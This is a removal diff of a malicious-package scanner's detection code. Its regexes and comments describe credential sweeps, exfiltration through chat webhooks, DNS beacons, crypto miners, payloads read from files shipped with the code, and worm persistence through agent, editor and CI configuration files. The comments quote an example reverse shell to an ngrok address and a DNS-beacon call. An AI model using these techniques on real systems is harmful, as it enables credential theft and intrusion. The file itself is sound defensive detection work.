-    r"|(?:\$\(|`)\s*(?:whoami|hostname|id|uname|ifconfig|ip\s+a|pwd|ls|cat\s+/etc/passwd|ps)\b"
-    r"|\bos\.(?:hostname|userInfo)\s*[,)]")
-
-
-def sends_host_info(text):
-    """True when `text` collects the machine's user or host name (or runs
-    whoami, hostname, ifconfig …) and sends data over the network."""
-    return bool(_HOST_INFO_RE.search(text) and (_NETWORK_RE.search(text) or _EXFIL_SERVICE_RE.search(text)))
-
-
-# Exfiltration shapes (0.1.8, from the rerun's misses that GuardDog caught).
-# Each one is strong wherever it is found — in an install script, in code
-# that runs on import, in the files a package runs when used — and none
-# was found in the benchmark's 429 popular packages:
-# - A chat bot or webhook whose secret is written in the code: a Telegram
-#   bot token (next to api.telegram.org), a Discord webhook's token or a
-#   Slack webhook's key, in a file that makes network calls. A library that
-#   talks to these services takes the key from its user; a package that
-#   ships its author's key reports whoever runs it to the author (figlets
-#   zips Exodus wallets and sends them to its bot; requestn uploads every
-#   file in the working folder). Placeholders (T00000000/…/XXXX, a secret of
-#   one repeated letter) are not keys.
-# - Credential files (.env, .npmrc, .pypirc, .netrc, .git-credentials,
-#   ~/.aws/credentials, an SSH private key, Docker's or kubectl's config)
-#   read in a file that sends data to a raw public IP address.
-# - Several credential folders named in one place (.ssh, .aws, .ethereum,
-#   .kube …: three or more within _CRED_SWEEP_SPAN characters) in a file
-#   that makes network calls: a sweep of the home folder for secrets.
-# - The machine's user or host name sent to an address the file keeps
-#   base64-encoded (a literal that decodes to "http…"), or looked up in DNS
-#   inside a name the code builds (the dependency-confusion DNS beacon), and
-#   the machine's public IP address (from ipify, ip-api …) sent to a
-#   data-capture service; an ngrok tunnel's own address counts as one.
-# - The whole environment copied to a variable and serialized
-#   (`d = dict(os.environ)` … `urlencode(d)`): read with the harvest test.
-# - A reverse shell given to an exec call as an argument list, or to an
-#   ngrok TCP address (`spawn('bash', ['-i', 'nc', '2.tcp.eu.ngrok.io', …])`).
-# - At install time only: a raw socket to a hard-coded IP address, as the
-#   test already reads a URL with one (loopback, and the public DNS
-#   resolvers a connectivity check uses, are not one).
-# - A cryptocurrency miner: a Monero wallet address in a file that runs a
-#   program with a mining pool's arguments (`-o pool:port`, stratum+tcp://,
-#   --donate-level, xmrig) — ultralytics 8.3.42 ran XMRig from safe_run().
-_CHAT_SECRET_RE = re.compile(
-    r"(?<![0-9])\d{8,10}:AA[A-Za-z0-9_-]{33}(?![A-Za-z0-9_-])"
-    r"|\b[Dd]iscord(?:app)?\.com/api/webhooks/\d{17,20}/[A-Za-z0-9_-]{60,80}"
-    r"|\bhooks\.slack\.com/services/T[A-Z0-9]{8,12}/B[A-Z0-9]{8,12}/[A-Za-z0-9]{24}(?![A-Za-z0-9])")
-_TELEGRAM_API_RE = re.compile(r"api\.telegram\.org", re.I)
-_CHAT_SECRET_NEEDLES = (":AA", "webhooks/", "hooks.slack.com")   # one is in every match
-_CHAT_SECRET_MAX = 50            # matches examined per text
-_CHAT_SECRET_MIN_DISTINCT = 10   # distinct characters a real secret has
-_CRED_FILE_RE = re.compile(
-    r"""["'`](?:~[/\\]|\.[/\\])?\.(?:env|npmrc|pypirc|netrc|git-credentials)["'`]"""
-    r"""|\.aws[/\\]credentials\b|[/\\]\.ssh[/\\]id_\w+|\.docker[/\\]config\.json|\.kube[/\\]config\b""")
-_PUBLIC_IP_URL_RE = re.compile(
-    r"\b(?:https?|wss?|tcp)://(?!(?:10|127|0)\.)(?!192\.168\.)(?!172\.(?:1[6-9]|2\d|3[01])\.)(?!169\.254\.)"
-    r"(?:(?:25[0-5]|2[0-4]\d|1?\d?\d)\.){3}(?:25[0-5]|2[0-4]\d|1?\d?\d)(?![\d.])")
-_CRED_DIR_RE = re.compile(
-    r"""["'`](?:~[/\\]|\$HOME[/\\]|%USERPROFILE%[/\\])?\.(ssh|aws|azure|gnupg|docker|kube|ethereum|electrum|bitcoin"""
-    r"""|solana|npmrc|pypirc|netrc|git-credentials|config[/\\]gcloud|password-store|vault-token|terraform\.d)"""
-    r"""(?:[/\\][^"'`\n]{0,60})?["'`]""")
-_CRED_SWEEP_NEEDLES = (".ssh", ".aws", ".azure", ".gnupg", ".docker", ".kube", ".ethereum", ".electrum", ".bitcoin",
-                       ".solana", ".npmrc", ".pypirc", ".netrc", ".git-credentials", ".config", ".password-store",
-                       ".vault-token", ".terraform.d")
-_CRED_SWEEP_SPAN = 400           # characters the credential folders are named within
-_CRED_SWEEP_MIN = 3              # distinct credential folders that make a sweep
-_CRED_SWEEP_MAX = 200            # folder names examined per text
-_B64_URL_LITERAL_RE = re.compile(r"""["'`]aHR0c[A-Za-z0-9+/]{2,}={0,2}["'`]""")
-# a DNS lookup of a name built in an f-string or a template literal (the
-# name, at most 300 characters, is read on its own; the first
-# _DNS_LOOKUP_MAX lookups of a text are)
-_DNS_LOOKUP_RE = re.compile(
-    r"""(?:\b(?:getaddrinfo|gethostbyname(?:_ex)?)|\bdns\.(?:promises\.)?(?:resolve\w*|lookup)"""
-    r"""|\bresolver\.(?:resolve|query))\s*\(\s*(?:f"([^"\n]{0,300})"|f'([^'\n]{0,300})'|`([^`\n]{0,300})`)""")
-_DNS_BUILT_NAME_RE = re.compile(r"\{[^}\n]+\}[^\n]*\.[A-Za-z]{2,}\Z")
-_DNS_LOOKUP_MAX = 50
-_PUBLIC_IP_LOOKUP_RE = re.compile(
-    r"\bapi(?:64)?\.ipify\.org\b|\bip-api\.com\b|\bipinfo\.io\b|\bifconfig\.me\b|\bicanhazip\.com\b"
-    r"|\bcheckip\.amazonaws\.com\b|\bipapi\.co\b|\bident\.me\b|\bapi\.myip\.com\b|\bwtfismyip\.com\b")
-_PUBLIC_IP_LOOKUP_NEEDLES = ("ipify.org", "ip-api.com", "ipinfo.io", "ifconfig.me", "icanhazip.com",
-                             "checkip.amazonaws.com", "ipapi.co", "ident.me", "api.myip.com", "wtfismyip.com")
-_ENV_COPY_RE = re.compile(
-    r"(?<![\w$.])([A-Za-z_$][\w$]*)\s{0,40}=\s{0,40}(?:dict\(\s*os\.environ\s*\)|os\.environ\.copy\(\s*\)"
-    r"|\{\s*\*\*\s*os\.environ\s*\}|\{\s*\.\.\.\s*process\.env\s*\}|Object\.assign\(\s*\{\s*\}\s*,\s*process\.env\s*\))")
-_ENV_COPY_MAX = 20               # copies examined per text
-# a copy's name serialized: the pattern built around it (the name escaped between)
-_ENV_COPY_USE_HEAD = r"\b(?:urlencode|dumps|stringify|b64encode|str)\(\s*"
-_ENV_COPY_USE_TAIL = r"\s*[,)]"
-# what every copy _ENV_COPY_RE finds contains: a text without it is not read
-# for the (slower) assignment
-_ENV_COPY_ANCHOR_RE = re.compile(
-    r"dict\(\s*os\.environ\s*\)|os\.environ\.copy\(\s*\)|\*\*\s*os\.environ|\.\.\.\s*process\.env"
-    r"|Object\.assign\(\s*\{\s*\}\s*,\s*process\.env")
-_REVSHELL_NGROK_TCP_RE = re.compile(r"\b\d+\.tcp(?:\.[a-z]{2,3})?\.ngrok\.io\b", re.I)
-_REVSHELL_ARG_SHELL_RE = re.compile(
-    r"""["'](?:nc|ncat|netcat|(?:/bin/)?(?:ba|z|da)?sh|cmd(?:\.exe)?|powershell(?:\.exe)?)["']""")
-_REVSHELL_ARGS_RE = re.compile(
-    r"""["'](?:nc|ncat|netcat)["'][^\n]{0,160}?["']-[ec]["']\s*,\s*["'](?:/bin/)?(?:ba|z|da)?sh["']""")
-_REVSHELL_ARGS_NEEDLES = ("'nc'", '"nc"', "'ncat'", '"ncat"', "'netcat'", '"netcat"')
-# What an ngrok TCP address holds (case as written: the prefilter of the
-# case-blind _REVSHELL_NGROK_TCP_RE). Needles, like the lists beside them:
-# a plain `".ngrok.io" in text` reads to code scanners as a URL check.
-_REVSHELL_NGROK_NEEDLES = (".ngrok.io",)
-_IP_LITERAL_RE = re.compile(
-    r"""["'](?!(?:127|0|255)\.)((?:(?:25[0-5]|2[0-4]\d|1?\d?\d)\.){3}(?:25[0-5]|2[0-4]\d|1?\d?\d))["']""")
-_RAW_CONNECT_RE = re.compile(
-    r"\b(?:socket\.create_connection|net\.connect|net\.createConnection|connect(?:_ex)?)\s*\(|\bnew\s+net\.Socket\b")
-_RAW_CONNECT_SPAN = 600          # characters after an IP literal searched for the connection
-_IP_LITERAL_MAX = 100            # IP literals examined per text
-_MONERO_ADDR_RE = re.compile(r"(?<![A-Za-z0-9])[48][1-9A-HJ-NP-Za-km-z]{94}(?:[1-9A-HJ-NP-Za-km-z]{11})?(?![A-Za-z0-9])")
-_MINER_ARG_RE = re.compile(r"""["'](?:-o|--url)["']|\bstratum\+(?:tcp|ssl|tls)://|--donate-level\b|\b(?:xmrig|XMRig|XMRIG)\b""")
-_MINER_ARG_NEEDLES = ("'-o'", '"-o"', "'--url'", '"--url"', "stratum+", "--donate-level", "xmrig", "XMRig", "XMRIG")
-_PUBLIC_RESOLVERS = frozenset({"8.8.8.8", "8.8.4.4", "1.1.1.1", "1.0.0.1", "9.9.9.9", "149.112.112.112",
-                               "208.67.222.222", "208.67.220.220"})
-
-
-def chat_secret_at(text):
-    """(offset, reason) of the first chat bot or webhook secret of `text`
-    (see above) in a file that makes network calls, else None."""
-    if not any(nd in text for nd in _CHAT_SECRET_NEEDLES):
-        return None
-    if not _NETWORK_RE.search(text):
-        return None
-    for k, m in enumerate(_CHAT_SECRET_RE.finditer(text)):
-        if k >= _CHAT_SECRET_MAX:
-            break
-        found = m.group(0)
-        if found.startswith(("discord", "Discord")):
-            hook, secret = found.rsplit("/", 2)[1:]
-            if len(set(secret)) >= _CHAT_SECRET_MIN_DISTINCT:
-                return m.start(), f"sends data to a Discord webhook whose token is written in the code (webhook {hook})"
-        elif found.startswith("hooks."):
-            team, _bot, secret = found.rsplit("/", 3)[1:]
-            if len(set(secret)) >= _CHAT_SECRET_MIN_DISTINCT and team.strip("T0"):
-                return m.start(), f"sends data to a Slack webhook whose key is written in the code ({team})"
-        else:
-            bot, secret = found.split(":", 1)
-            if len(set(secret)) >= _CHAT_SECRET_MIN_DISTINCT and _TELEGRAM_API_RE.search(text):
-                return m.start(), f"sends data to a Telegram bot whose token is written in the code (bot {bot})"
-    return None
-
-
-def credential_sweep_at(text):
-    """(offset, names) where `text` names _CRED_SWEEP_MIN or more distinct
-    credential folders within _CRED_SWEEP_SPAN characters, else None."""
-    if sum(1 for nd in _CRED_SWEEP_NEEDLES if nd in text) < _CRED_SWEEP_MIN:
-        return None
-    found = []
-    for k, m in enumerate(_CRED_DIR_RE.finditer(text)):
-        if k >= _CRED_SWEEP_MAX:
-            break
-        found.append((m.start(), m.group(1).replace("\\", "/")))
-    for i, (at, _name) in enumerate(found):
-        names = []
-        for at2, name in found[i:]:
-            if at2 - at > _CRED_SWEEP_SPAN:
-                break
-            if name not in names:
-                names.append(name)
-        if len(names) >= _CRED_SWEEP_MIN:
-            return at, names
-    return None
-
-
-def env_copy_serialized_at(text):
-    """The offset where `text` serializes a copy of the whole environment
-    it made (`d = dict(os.environ)` … `urlencode(d)`), else -1."""
-    if ("os.environ" not in text and "process.env" not in text) or _ENV_COPY_ANCHOR_RE.search(text) is None:
-        return -1
-    for k, m in enumerate(_ENV_COPY_RE.finditer(text)):
-        if k >= _ENV_COPY_MAX:
-            break
-        use = re.compile(_ENV_COPY_USE_HEAD + re.escape(m.group(1)) + _ENV_COPY_USE_TAIL)
-        u = use.search(text, m.end())
-        if u:
-            return u.start()
-    return -1
-
-
-def _exfil_signs(text, host):
-    """(offset, reason) of the exfiltration shapes above that `text` shows,
-    and of a miner, for the install-script and import-time tests (the
-    whole-environment copy and the reverse shell are read by those tests'
-    own checks). `host`: _HOST_INFO_RE.search(text)."""
-    signs = []
-    at = miner_at(text)
-    if at >= 0:
-        signs.append((at, "runs a cryptocurrency miner (a Monero wallet address)"))
-    chat = chat_secret_at(text)
-    if chat is not None:
-        signs.append(chat)
-    net = []                          # _NETWORK_RE's answer, searched once when needed
-
-    def network():
-        if not net:
-            net.append(_NETWORK_RE.search(text) is not None)
-        return net[0]
-    ip = _PUBLIC_IP_URL_RE.search(text)
-    if ip:
-        cred = _CRED_FILE_RE.search(text)
-        if cred and network():
-            signs.append((cred.start(), "reads credential files and sends data to an IP address "
-                                        f"({ip.group(0).split('//', 1)[1]})"))
-    sweep = credential_sweep_at(text)
-    if sweep is not None and network():
-        signs.append((sweep[0], "collects files from several credential folders and sends data over the network "
-                                f"({', '.join('.' + n for n in sweep[1][:4])})"))
-    if host:
-        if _B64_URL_LITERAL_RE.search(text) and network():
-            signs.append((host.start(), "sends the machine's user or host name to an address it hides in base64"))
-        at = dns_beacon_at(text)
-        if at >= 0:
-            signs.append((at, "sends the machine's user or host name in a DNS lookup of a name it builds"))
-    elif any(nd in text for nd in _PUBLIC_IP_LOOKUP_NEEDLES):
-        lookup = _PUBLIC_IP_LOOKUP_RE.search(text)
-        if lookup:
-            capture = capture_service(text)
-            if capture:
-                signs.append((lookup.start(), "sends the machine's public IP address to a data-capture service "
-                                              f"({capture.group(0)[:40]})"))
-    return signs
-
-
-def dns_beacon_at(text):
-    """The offset of a DNS lookup of a name `text` builds from values
-    (`getaddrinfo(f"{h}.{u}.x.com")`, `dns.lookup(`${h}.x.com`)`), else -1."""
-    for k, m in enumerate(_DNS_LOOKUP_RE.finditer(text)):
-        if k >= _DNS_LOOKUP_MAX:
-            break
-        name = next(g for g in m.groups() if g is not None)
-        if _DNS_BUILT_NAME_RE.search(name):
-            return m.start()
-    return -1
-
-
-def miner_at(text):
-    """The offset of the Monero wallet address `text` runs a miner with (see
-    above), else -1."""
-    if not any(nd in text for nd in _MINER_ARG_NEEDLES) or _MINER_ARG_RE.search(text) is None:
-        return -1
-    m = _MONERO_ADDR_RE.search(text)
-    if m and _EXEC_CALL_RE.search(text):
-        return m.start()
-    return -1
-
-
-def raw_ip_connect(text):
-    """The first hard-coded IP address `text` opens a raw socket to (a
-    literal with a connection within _RAW_CONNECT_SPAN characters after it;
-    loopback and the public DNS resolvers excepted), else None — install
-    time only."""
-    if "connect" not in text and "Socket" not in text:
-        return None
-    for k, m in enumerate(_IP_LITERAL_RE.finditer(text)):
-        if k >= _IP_LITERAL_MAX:
-            break
-        if m.group(1) in _PUBLIC_RESOLVERS:
-            continue
-        if _RAW_CONNECT_RE.search(text, m.end(), m.end() + _RAW_CONNECT_SPAN):
-            return m.group(1)
-    return None
-
-
-# Code read back from the file itself (0.1.7). A payload — or a hint such as
-# a C2 address — can sit in a comment or a docstring of the file that uses
-# it, read back with open(__file__), Path(__file__).read_text(), linecache,
-# __loader__.get_source or __doc__ (in JavaScript readFileSync(__filename),
-# import.meta.url, a function's .toString()). Running what such a read gives —
-# or what a read of a data file shipped next to the code gives (a path built
-# from __file__ / __dirname / import.meta.url that names a file with a
-# non-code extension: .txt, .dat, .png …) — is a sign of its own: a value
-# assigned from the read is followed through the names it is assigned to
-# (_SELF_READ_PASSES levels), to a runner's arguments (at most
-# _SELF_READ_ARG_SPAN characters of each of the first _SELF_READ_MAX_CALLS
-# runners). A .py or .js file read and run is not: setup.py's
-# `exec(open("pkg/version.py").read())` reads a version. The import-time test
-# reads a file that reads its own source with its prose (_import_code).
-#
-# (0.1.8) The data file may be a licence or a readme without an extension,
-# which holds no code (react-thunk-log 2.23.2 kept its payload, encrypted, in
-# lib/utils/smtp-connection/LICENSE, next to the script its install hook
-# starts); what a read gives may arrive asynchronously — the second parameter
-# of the read's callback (`fs.readFile(p, 'utf8', (err, data) => …)`), the
-# parameter of a `.then(…)` chained to it, a Python `with open(…) as f`; and
-# the path may be built on a line of its own and read by its name (`const p =
-# path.join(__dirname, 'LICENSE')` … `fs.readFile(p, …)`). A value that comes
-# from a path read by name counts only in a code runner (eval, exec, compile,
-# new Function, vm.run*): a CLI reads its package.json by name and puts the
-# version in a git command.
-_SELF_READ_RE = re.compile(
-    r"\bopen\s*\(\s*(?:os\.path\.(?:abspath|realpath)\s*\(\s*)?__file__\b"
-    r"|\bPath\s*\(\s*__file__\s*\)\s*\.\s*(?:read_text|read_bytes|open)\s*\("
-    r"|\blinecache\.getlines?\s*\(\s*__file__\b|(?<![\w.])__loader__\s*\.\s*get_source\s*\(|(?<![\w.])__doc__\b"
-    r"|\breadFile(?:Sync)?\s*\(\s*(?:__filename\b|(?:new\s+URL\s*\(\s*)?import\.meta\.url"
-    r"|fileURLToPath\s*\(\s*import\.meta\.url)|\barguments\s*\.\s*callee\b|\}\s*\)?\s*\.\s*toString\s*\(\s*\)")
-_DATA_EXT = (r"(?:txt|dat|bin|png|jpe?g|gif|ico|bmp|svg|wav|mp3|mp4|woff2?|ttf|json|md|cfg|ini|log|db|pyc|so|dll"
-             r"|dylib|exe)")
-# a data file's name inside quotes: a data extension, or a licence or readme
-# with or without one (no template's `${…}` in it: a name that runs into one
-# is read again from every delimiter)
-_DATA_FILE = (r"(?:[^\"'`{}$\n]{1,100}\." + _DATA_EXT + r"|(?:[^\"'`{}$\n]{0,100}[/\\])?"
-              r"(?:LICEN[CS]E|COPYING|NOTICE|README|AUTHORS|CHANGELOG|CHANGES|HISTORY|PATENTS)(?:[-.]\w{1,10})?)")
-_SIBLING_DATA_RE = re.compile(
-    r"\b(?:open|read_text|read_bytes|readFileSync|readFile)\s*\([^\n]{0,200}?(?:__file__|__dirname|import\.meta\.url)"
-    r"[^\n]{0,200}?[\"']" + _DATA_FILE + r"[\"']"
-    r"|(?:__file__|__dirname)[^\n]{0,200}?[\"']" + _DATA_FILE + r"[\"'][^\n]{0,60}?"
-    r"\.\s*(?:read_text|read_bytes)\s*\(")
-# a data file's path, assigned to a name: the file named after __file__,
-# __dirname or import.meta.url, in quotes or after a template's `${__dirname}/`
-_SIBLING_PATH_RE = re.compile(
-    r"(?:__file__|__dirname|import\.meta\.url)[^\n]{0,200}?(?:[\"'`]|\}[/\\])" + _DATA_FILE + r"[\"'`]")
-# a read of a path by its name (the name is checked against the data-file
-# paths), a read call's head, the node-style callback in its arguments, and
-# what may follow the call: `.then(x => …)` or Python's `as f`
-_PATH_READ_RE = re.compile(
-    r"\b(?:open|read_text|read_bytes|readFileSync|readFile)\s*\(\s*([A-Za-z_$][\w$]*)\s*[,)]"
-    r"|(?<![\w$.])([A-Za-z_$][\w$]*)\s*\.\s*(?:read_text|read_bytes)\s*\(")
-_READ_HEAD_RE = re.compile(r"\b(?:open|read_text|read_bytes|readFileSync|readFile)\s*\(")
-_READ_CALLBACK_RE = re.compile(r"\(\s*[A-Za-z_$][\w$]*\s*,\s*([A-Za-z_$][\w$]*)\s*\)\s*(?:=>|\{)")
-_READ_THEN_RE = re.compile(
-    r"\s*(?:\.\s*then\s*\(\s*(?:async\s+)?(?:function\b\s*[\w$]*\s*)?\(?\s*([A-Za-z_$][\w$]*)|as\s+([A-Za-z_]\w*))")
-_SELF_RUN_RE = re.compile(
-    r"(?<![\w.$])(?:exec|eval|compile)\s*\(|\bnew\s+Function\s*\(|\bvm\s*\.\s*run\w*\s*\("
-    r"|\b(?:execSync|system|popen|Popen|check_output|getoutput)\s*\(|\bsubprocess\s*\.\s*\w+\s*\(")
-# the runners that run a shell command, not code
-_SELF_SHELL_RUNNERS = ("execSync", "system", "popen", "Popen", "check_output", "getoutput", "subprocess")
-_SELF_READ_ASSIGN_RE = re.compile(
-    r"(?<![^\n])[ \t]*(?:(?:const|let|var)[ \t]+)?([A-Za-z_$][\w$]*)[ \t]*(?::[^=\n]*)?=(?![=>])([^\n]*)")
-_IDENT_TOKEN_RE = re.compile(r"(?<![\w$.])[A-Za-z_$][\w$]*")
-_SELF_READ_PASSES = 3            # levels of names followed from a read
-_SELF_READ_MAX_CALLS = 200       # runners examined per text, and read calls
-_SELF_READ_ARG_SPAN = 2000       # characters of a runner's or a read's arguments read
-_SELF_READ_MAX_ASSIGNS = 5000    # assignments examined per text
-_SELF_READ_THEN_SPAN = 200       # characters after a read's call searched for .then( or `as`
-
-
-def reads_own_source(text):
-    """Does `text` read its own source (see above)?"""
-    return _SELF_READ_RE.search(text) is not None
-
-
-def _call_args(text):
-    """`text` (what follows a call's '(') up to the bracket that closes the
-    call; string literals are skipped."""
-    depth, i, n = 0, 0, len(text)
-    while i < n:
-        ch = text[i]
-        if ch in "\"'`":
-            j = text.find(ch, i + 1)
-            if j < 0:
-                return text
-            i = j + 1
-            continue
-        if ch in "([{":
-            depth += 1
-        elif ch in ")]}":
-            if depth == 0:
-                return text[:i]
-            depth -= 1
-        i += 1
-    return text
-
-
-_LITERAL_SPANS_MAX = 20000       # literals a text's runners and reads are told apart from
-
-
-def _literal_spans(text):
-    """(start, end) of the string literals of `text`, as _string_literals
-    reads them (at most _LITERAL_SPANS_MAX of them). One pass."""
-    out, i, n = [], 0, len(text)
-    while i < n and len(out) < _LITERAL_SPANS_MAX:
-        ch = text[i]
-        if ch not in "\"'`":
-            i += 1
-            continue
-        if ch != "`" and text.startswith(ch * 3, i):
-            j = text.find(ch * 3, i + 3)
-            end = n if j < 0 else j + 3
-            out.append((i, end))
-            i = end
-            continue
-        j = i + 1
-        while j < n and text[j] != ch and (ch == "`" or text[j] != "\n"):
-            j += 2 if text[j] == "\\" else 1
-        end = min(j + 1, n)
-        out.append((i, end))
-        i = end
-    return out
-
-
-def runs_own_source_at(text):
-    """The offset of a runner that runs code `text` reads from its own
-    source or from a data file shipped next to it (see above), else -1.
-    Runners, reads and names inside string literals do not count (a code
-    template in a string, a list of dunder names)."""
-    if not (_SELF_READ_RE.search(text) or _SIBLING_DATA_RE.search(text) or _SIBLING_PATH_RE.search(text)):
-        return -1
-    spans = _literal_spans(text)
-    starts = [s for s, _ in spans]
-
-    def literal_at(pos):
-        """The literal (start, end) that pos is in, or None."""
-        k = bisect.bisect_right(starts, pos) - 1
-        return spans[k] if k >= 0 and pos < spans[k][1] else None
-
-    def in_literal(pos):
-        return literal_at(pos) is not None
-
-    def reads(lo, hi):
-        part = text[lo:hi]
-        return any(not in_literal(lo + m.start()) for rx in (_SELF_READ_RE, _SIBLING_DATA_RE)
-                   for m in rx.finditer(part))
-
-    def path_reads(lo, hi):
-        return bool(paths) and any((m.group(1) or m.group(2)) in paths and not in_literal(lo + m.start())
-                                   for m in _PATH_READ_RE.finditer(text[lo:hi]))
-
-    def uses(lo, hi, names):
-        return bool(names) and any(m.group() in names and not in_literal(lo + m.start())
-                                   for m in _IDENT_TOKEN_RE.finditer(text[lo:hi]))
-
-    assigns = []
-    for k, m in enumerate(_SELF_READ_ASSIGN_RE.finditer(text)):
-        if k >= _SELF_READ_MAX_ASSIGNS:
-            break
-        if not in_literal(m.start(1)):
-            assigns.append((m.group(1), m.start(2), m.end(2)))
-    paths = set()                   # names of data files' paths (a template's `${__dirname}` counts)
-    for name, lo, hi in assigns:
-        for m in _SIBLING_PATH_RE.finditer(text[lo:hi]):
-            lit = literal_at(lo + m.start())
-            if lit is None or text[lit[0]] == "`":
-                paths.add(name)
-                break
-    if not (reads(0, len(text)) or path_reads(0, len(text))):
-        return -1
-    names = set()                   # values of a read written out: any runner
-    code_names = set()              # values of a path read by name: code runners only
-    for k, h in enumerate(_READ_HEAD_RE.finditer(text)):
-        if k >= _SELF_READ_MAX_CALLS:
-            break
-        if in_literal(h.start()):
-            continue
-        args = _call_args(text[h.end():h.end() + _SELF_READ_ARG_SPAN])
-        close = h.end() + len(args)                 # the closing bracket, when there is one
-        into = (names if reads(h.start(), close + 1) else code_names if path_reads(h.start(), close + 1)
-                else None)
-        if into is None:
-            continue
-        cb = _READ_CALLBACK_RE.search(args)
-        if cb is not None and not in_literal(h.end() + cb.start()):
-            into.add(cb.group(1))
-        if close < len(text) and text[close] == ")":
-            then = _READ_THEN_RE.match(text[close + 1:close + 1 + _SELF_READ_THEN_SPAN])
-            if then is not None:
-                into.add(then.group(1) or then.group(2))
-    for _ in range(_SELF_READ_PASSES):
-        grown = False
-        for name, lo, hi in assigns:
-            if name in names:
-                continue
-            if reads(lo, hi) or uses(lo, hi, names):
-                names.add(name)
-                grown = True
-            elif name not in code_names and (path_reads(lo, hi) or uses(lo, hi, code_names)):
-                code_names.add(name)
-                grown = True
-        if not grown:
-            break
-    for k, m in enumerate(_SELF_RUN_RE.finditer(text)):
-        if k >= _SELF_READ_MAX_CALLS:
-            break
-        if in_literal(m.start()):
-            continue
-        hi = m.end() + len(_call_args(text[m.end():m.end() + _SELF_READ_ARG_SPAN]))
-        if reads(m.end(), hi) or uses(m.end(), hi, names):
-            return m.start()
-        if not m.group().startswith(_SELF_SHELL_RUNNERS) and (path_reads(m.end(), hi) or uses(m.end(), hi, code_names)):
-            return m.start()
-    return -1
-
-
-# ---------------- Persistence targets (0.1.7) ----------------
-# Where the 2025-26 npm worms made themselves stay. Mini Shai-Hulud and the
-# keyv wave committed a Claude Code SessionStart hook (.claude/settings.json)
-# and a VS Code folder-open task (.vscode/tasks.json) to every repository they
-# reached, each running the other's copy of the loader, so opening a checkout
-# ran the worm; Shai-Hulud planted GitHub Actions workflows that dump every
-# repository secret, and a discussion-triggered one that runs the discussion
-# text on a self-hosted runner it registered on the victim's machine;
-# GlassWorm pushed editor extensions with `code --install-extension`. No
-# package needs to do any of this while it is installed, so each is a reason
-# of the install-script test (CRITICAL in an install hook). Import-time code
-# gets only the workflow that dumps every secret: a CLI's `init` command
-# legitimately writes agent hooks, editor tasks, MCP servers and CI workflows.
-#
-# A settings file is named whole (".claude/settings.json", a template's
-# `${home}/.claude/settings.json`) or as the two literals a path join takes
-# (`path.join(home, ".claude", "settings.json")`, `Path.home() / ".claude" /
-# "settings.json"`); _PERSIST_AGENT_PAIRS says which file each directory's
-# tool runs commands from. The file must also be written: by a write call
-# anywhere in the text (fs, fs-extra, pathlib, json.dump, open(…, "w"),
-# shutil, Octokit's createOrUpdateFileContents), or by a shell write on a line
-# that names it (a redirection, tee, cp, mv, PowerShell's Set-Content …).
-_PERSIST_AGENT_SRC = (
-    r"""(?:\.(?:claude|gemini)[/\\]settings(?:\.local)?|\.vscode[/\\](?:tasks|mcp)|\.cursor[/\\](?:hooks|mcp)"""
-    r"""|(?<![\w.-])\.(?:mcp|claude))\.json(?![\w.-])""")
-_PERSIST_AGENT_SPLIT_SRC = (
-    r"""["'`]\.(claude|gemini|vscode|cursor)["'`]\s{0,20}[,+/]\s{0,20}["'`](settings(?:\.local)?|tasks|hooks|mcp)\.json["'`]""")
-_PERSIST_AGENT_PAIRS = {"claude": ("settings", "settings.local"), "gemini": ("settings",),
-                        "vscode": ("tasks", "mcp"), "cursor": ("hooks", "mcp")}
-_PERSIST_WORKFLOW_SRC = r"""\.github[/\\]workflows\b|["'`]\.github["'`]\s{0,20}[,+/]\s{0,20}["'`]workflows\b"""
-_PERSIST_EXT_DIR_SRC = (
-    r"""[/\\]\.(?:vscode(?:-insiders|-oss|-server)?|cursor|windsurf|vscodium|positron)[/\\]extensions\b"""
-    r"""|["'`]\.(?:vscode(?:-insiders|-oss|-server)?|cursor|windsurf|vscodium|positron)["'`]\s{0,20}[,+/]\s{0,20}"""
-    r"""["'`]extensions["'`]""")
-_PERSIST_WRITE_SRC = (
-    r"""\b(?:writeFileSync|writeFile|appendFileSync|appendFile|createWriteStream|outputFileSync|outputFile"""
-    r"""|outputJsonSync|outputJson|writeJsonSync|writeJson|copyFileSync|copyFile|cpSync|renameSync|symlinkSync"""
-    r"""|write_text|write_bytes|createOrUpdateFileContents)\s*\(|\bjson\.dump\s*\(|\bshutil\.(?:copy\w*|move)\s*\("""
-    r"""|\bopen\s*\([^()\n]{0,300}?["'][wax]b?\+?["']""")
-_PERSIST_SHELL_WRITE_SRC = (
-    r""">|\b(?:tee|cp|mv|install|ln|copy|xcopy)\s|\b(?:Set-Content|Out-File|Add-Content|Copy-Item|New-Item)\b"""
-    r"""|\bgit\s+(?:add|commit)\b""")
-_PERSIST_EXT_INSTALL_SRC = r"""--install-extension\b"""
-# An editor's CLI at a command's start (a line start is written `(?<![^\n])`:
-# under re.M, JavaScript's `^` would also match after \r and \u2028), and a
-# runner's release or its config script. Each is matched once per line with
-# what must follow it later on that line (_after_on_line): a pattern with a
-# gap between the two, `code[^\n]{0,400}?--install-extension`, is searched
-# again from every start, 400 times the text's length.
-_PERSIST_EXT_CLI_SRC = (
-    r"""(?:(?<![^\n])|[;&|(])[ \t]*(?:sudo[ \t]+)?(?:code|code-insiders|codium|cursor|windsurf|positron)(?:\.cmd|\.exe)?"""
-    r"""[ \t]""")
-_PERSIST_RUNNER_SRC = r"""actions/runner/releases|\bactions-runner-(?:linux|osx|win)-"""
-_PERSIST_RUNNER_CONFIG_SRC = r"""\bconfig\.(?:sh|cmd)\b"""
-_PERSIST_RUNNER_ARG_SRC = r"""--(?:token|url)\b"""
-_BUN_RELEASES_SRC = r"""oven-sh/bun/releases"""
-_SECRETS_DUMP_SRC = r"""\btoJSON\s*\(\s*secrets\s*\)"""
-_PERSIST_AGENT_RE = re.compile(_PERSIST_AGENT_SRC)
-_PERSIST_AGENT_SPLIT_RE = re.compile(_PERSIST_AGENT_SPLIT_SRC)
-_PERSIST_WORKFLOW_RE = re.compile(_PERSIST_WORKFLOW_SRC)
-_PERSIST_EXT_DIR_RE = re.compile(_PERSIST_EXT_DIR_SRC)
-_PERSIST_WRITE_RE = re.compile(_PERSIST_WRITE_SRC)
-_PERSIST_SHELL_WRITE_RE = re.compile(_PERSIST_SHELL_WRITE_SRC)
-_PERSIST_EXT_INSTALL_RE = re.compile(_PERSIST_EXT_INSTALL_SRC)
-_PERSIST_EXT_CLI_RE = re.compile(_PERSIST_EXT_CLI_SRC)
-_PERSIST_RUNNER_RE = re.compile(_PERSIST_RUNNER_SRC)
-_PERSIST_RUNNER_CONFIG_RE = re.compile(_PERSIST_RUNNER_CONFIG_SRC)
